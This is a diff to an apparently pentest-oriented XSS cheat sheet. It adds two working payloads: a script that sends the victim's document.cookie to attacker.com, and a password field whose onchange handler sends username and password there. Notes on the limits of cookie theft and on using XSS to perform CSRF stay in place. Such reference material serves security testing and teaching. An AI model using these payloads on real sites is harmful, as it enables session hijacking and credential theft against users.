@@ -318,16 +318,44 @@ ${alert(document.domain)}
 
 ## <mark style="color:yellow;">Exploitation</mark>
 
-* Exploiting XSS to **steal cookies** and send the victim's cookies to your own domain
-  * Limitation:
-    * The victim might not be logged in.
-    * Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
-    * Sessions might be locked to additional factors like the user's IP address.
-    * The session might time out before you're able to hijack it.
-* Exploiting XSS to **capture passwords**
-* Exploiting XSS to **perform CSRF**
-  * When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.
-  * If the site use a token you can get it doing a first request and then add the token in a second request
+Exploiting XSS to **steal cookies** and send the victim's cookies to your own domain
+
+```html
+<script>
+fetch('https://attacker.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+Limitation:
+
+* The victim might not be logged in.
+* Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
+* Sessions might be locked to additional factors like the user's IP address.
+* The session might time out before you're able to hijack it.
+
+***
+
+Exploiting XSS to **capture passwords**
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://attacker.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+***
+
+Exploiting XSS to **perform CSRF**
+
+* When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.
+* If the site use a token you can get it doing a first request and then add the token in a second request
 
 ## <mark style="color:yellow;">Content security policy</mark>
 
